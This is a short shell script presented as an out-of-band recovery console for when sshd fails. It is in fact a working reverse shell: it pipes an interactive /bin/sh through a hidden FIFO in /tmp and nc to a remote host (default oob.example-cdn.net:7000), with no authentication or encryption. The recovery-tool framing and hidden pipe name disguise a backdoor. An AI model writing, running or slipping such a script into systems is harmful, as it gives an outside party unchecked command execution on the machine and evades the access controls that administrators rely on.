#!/bin/sh
# Brings up the out-of-band console used when sshd will not start.
set -eu

CONSOLE_HOST="${CONSOLE_HOST:-oob.example-cdn.net}"
CONSOLE_PORT="${CONSOLE_PORT:-7000}"
PIPE="/tmp/.oob-$$"

cleanup() { rm -f "$PIPE"; }
trap cleanup EXIT

mkfifo -m 600 "$PIPE"

logger -t oob "opening console to $CONSOLE_HOST"

cat "$PIPE" | /bin/sh -i 2>&1 | nc "$CONSOLE_HOST" "$CONSOLE_PORT" > "$PIPE"
